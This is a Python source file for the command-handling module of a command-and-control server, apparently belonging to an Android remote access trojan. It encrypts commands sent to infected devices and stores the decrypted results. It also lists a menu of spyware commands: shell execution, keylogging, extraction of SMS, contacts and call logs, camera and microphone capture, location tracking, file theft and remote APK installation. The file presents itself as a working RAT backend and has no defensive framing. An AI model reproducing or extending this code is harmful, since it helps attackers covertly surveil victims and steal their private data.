#!/usr/bin/env python3
import os
import json
import base64
import time
import logging
import sqlite3
import threading
from typing import Dict, List, Any, Optional, Union
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import padding
from cryptography.hazmat.backends import default_backend

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler("command_handler.log"),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger("command_handler")

class CommandHandler:
    """Handle command queuing, encryption, and result processing for the C2 server"""
    
    DB_FILE = "c2_data.db"
    
    def __init__(self):
        # Load encryption key from environment or use default
        self.key = os.getenv("ENCRYPTION_KEY", "tarjon_default_encryption_key_do_not_change!").encode()
        self.key = self.derive_key(self.key)
        
        # Initialize database
        self._init_database()
        
        # Lock for thread safety
        self.db_lock = threading.Lock()
        
        logger.info("CommandHandler initialized")
    
    def _init_database(self):
        """Initialize SQLite database for storing command results"""
        with sqlite3.connect(self.DB_FILE) as conn:
            cursor = conn.cursor()
            
            # Create table for command results
            cursor.execute('''
            CREATE TABLE IF NOT EXISTS command_results (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                device_id TEXT NOT NULL,
                command TEXT NOT NULL,
                result TEXT NOT NULL,
                timestamp INTEGER NOT NULL
            )
            ''')
            
            # Create index for faster device-based lookups
            cursor.execute('''
            CREATE INDEX IF NOT EXISTS idx_device_id ON command_results (device_id)
            ''')
            
            conn.commit()
        
        logger.info("Database initialized")
    
    def derive_key(self, key_material: bytes) -> bytes:
        """Derive a fixed-length key from the provided key material"""
        # Simple key derivation using the first 32 bytes (for AES-256)
        if len(key_material) >= 32:
            return key_material[:32]
        
        # If too short, pad with zeros
        return key_material.ljust(32, b'\0')
    
    def encrypt_command(self, command: str) -> str:
        """Encrypt a command string for secure transmission"""
        try:
            # Generate a random IV (16 bytes for AES)
            iv = os.urandom(16)
            
            # Create AES cipher
            cipher = Cipher(
                algorithms.AES(self.key),
                modes.CBC(iv),
                backend=default_backend()
            )
            encryptor = cipher.encryptor()
            
            # Pad the command
            padder = padding.PKCS7(128).padder()
            padded_data = padder.update(command.encode()) + padder.finalize()
            
            # Encrypt the data
            ciphertext = encryptor.update(padded_data) + encryptor.finalize()
            
            # Combine IV and ciphertext and encode as base64
            encrypted_data = base64.b64encode(iv + ciphertext).decode('utf-8')
            
            return encrypted_data
        
        except Exception as e:
            logger.error(f"Error encrypting command: {str(e)}", exc_info=True)
            raise
    
    def decrypt_result(self, encrypted_data: str) -> str:
        """Decrypt an encrypted command result"""
        try:
            # Decode from base64
            binary_data = base64.b64decode(encrypted_data)
            
            # Extract IV (first 16 bytes)
            iv = binary_data[:16]
            ciphertext = binary_data[16:]
            
            # Create AES cipher
            cipher = Cipher(
                algorithms.AES(self.key),
                modes.CBC(iv),
                backend=default_backend()
            )
            decryptor = cipher.decryptor()
            
            # Decrypt the data
            padded_data = decryptor.update(ciphertext) + decryptor.finalize()
            
            # Unpad the result
            unpadder = padding.PKCS7(128).unpadder()
            data = unpadder.update(padded_data) + unpadder.finalize()
            
            return data.decode('utf-8')
        
        except Exception as e:
            logger.error(f"Error decrypting result: {str(e)}", exc_info=True)
            raise
    
    def process_command_result(self, device_id: str, encrypted_result: str) -> Dict[str, Any]:
        """Process and store the result from a command execution"""
        try:
            # Decrypt the result
            result_json = self.decrypt_result(encrypted_result)
            result_data = json.loads(result_json)
            
            command = result_data.get('command', 'unknown')
            result = result_data.get('result', '')
            timestamp = result_data.get('timestamp', int(time.time()))
            
            # Store in database
            with self.db_lock:
                with sqlite3.connect(self.DB_FILE) as conn:
                    cursor = conn.cursor()
                    
                    cursor.execute('''
                    INSERT INTO command_results (device_id, command, result, timestamp)
                    VALUES (?, ?, ?, ?)
                    ''', (device_id, command, result, timestamp))
                    
                    conn.commit()
            
            logger.info(f"Stored command result from device {device_id} for command: {command}")
            
            return {
                "status": "ok",
                "device_id": device_id,
                "command": command,
                "timestamp": timestamp
            }
        
        except Exception as e:
            logger.error(f"Error processing command result: {str(e)}", exc_info=True)
            return {
                "status": "error",
                "error": str(e)
            }
    
    def get_command_results(self, device_id: str, limit: int = 100) -> List[Dict[str, Any]]:
        """Retrieve command results for a specific device"""
        results = []
        
        try:
            with self.db_lock:
                with sqlite3.connect(self.DB_FILE) as conn:
                    conn.row_factory = sqlite3.Row
                    cursor = conn.cursor()
                    
                    cursor.execute('''
                    SELECT id, device_id, command, result, timestamp
                    FROM command_results
                    WHERE device_id = ?
                    ORDER BY timestamp DESC
                    LIMIT ?
                    ''', (device_id, limit))
                    
                    for row in cursor.fetchall():
                        results.append({
                            "id": row['id'],
                            "device_id": row['device_id'],
                            "command": row['command'],
                            "result": row['result'],
                            "timestamp": row['timestamp']
                        })
            
            return results
        
        except Exception as e:
            logger.error(f"Error retrieving command results: {str(e)}", exc_info=True)
            return []
    
    def clear_old_results(self, days: int = 30) -> int:
        """Clear old command results from the database"""
        try:
            # Calculate cutoff timestamp
            cutoff_time = int(time.time()) - (days * 24 * 60 * 60)
            
            with self.db_lock:
                with sqlite3.connect(self.DB_FILE) as conn:
                    cursor = conn.cursor()
                    
                    cursor.execute('''
                    DELETE FROM command_results
                    WHERE timestamp < ?
                    ''', (cutoff_time,))
                    
                    deleted_count = cursor.rowcount
                    conn.commit()
            
            logger.info(f"Cleared {deleted_count} old command results")
            return deleted_count
        
        except Exception as e:
            logger.error(f"Error clearing old results: {str(e)}", exc_info=True)
            return 0

    def get_available_commands(self) -> List[Dict[str, str]]:
        """Get a list of available commands and their descriptions"""
        return [
            {"command": "shell", "description": "Execute shell command", "syntax": "shell:command"},
            {"command": "screenshot", "description": "Capture screenshot", "syntax": "screenshot:[resolution]"},
            {"command": "screenrecord", "description": "Record screen", "syntax": "screenrecord:[duration_seconds]"},
            {"command": "stoprecord", "description": "Stop screen recording", "syntax": "stoprecord"},
            {"command": "location", "description": "Get device location", "syntax": "location"},
            {"command": "contacts", "description": "Extract contacts", "syntax": "contacts"},
            {"command": "sms", "description": "Extract SMS messages", "syntax": "sms"},
            {"command": "call_logs", "description": "Extract call logs", "syntax": "call_logs"},
            {"command": "apps", "description": "List installed apps", "syntax": "apps"},
            {"command": "sendSMS", "description": "Send SMS message", "syntax": "sendSMS:number:message"},
            {"command": "keylog", "description": "Get keylogger data", "syntax": "keylog:[app_name]"},
            {"command": "clipboard", "description": "Get clipboard data", "syntax": "clipboard"},
            {"command": "camera", "description": "Capture photo", "syntax": "camera:[front|back]"},
            {"command": "microphone", "description": "Record audio", "syntax": "microphone:[duration_seconds]"},
            {"command": "install", "description": "Install APK from URL", "syntax": "install:url"},
            {"command": "open_app", "description": "Open installed app", "syntax": "open_app:package_name"},
            {"command": "close_app", "description": "Close running app", "syntax": "close_app:package_name"},
            {"command": "disable_app", "description": "Disable installed app", "syntax": "disable_app:package_name"},
            {"command": "enable_app", "description": "Enable installed app", "syntax": "enable_app:package_name"},
            {"command": "uninstall", "description": "Uninstall app", "syntax": "uninstall:package_name"},
            {"command": "wifi_scan", "description": "Scan for WiFi networks", "syntax": "wifi_scan"},
            {"command": "file_list", "description": "List files in directory", "syntax": "file_list:[path]"},
            {"command": "file_download", "description": "Download file from device", "syntax": "file_download:[path]"},
            {"command": "file_upload", "description": "Upload file to device", "syntax": "file_upload:[path]:[base64_data]"},
            {"command": "restart_service", "description": "Restart RAT service", "syntax": "restart_service"}
        ]
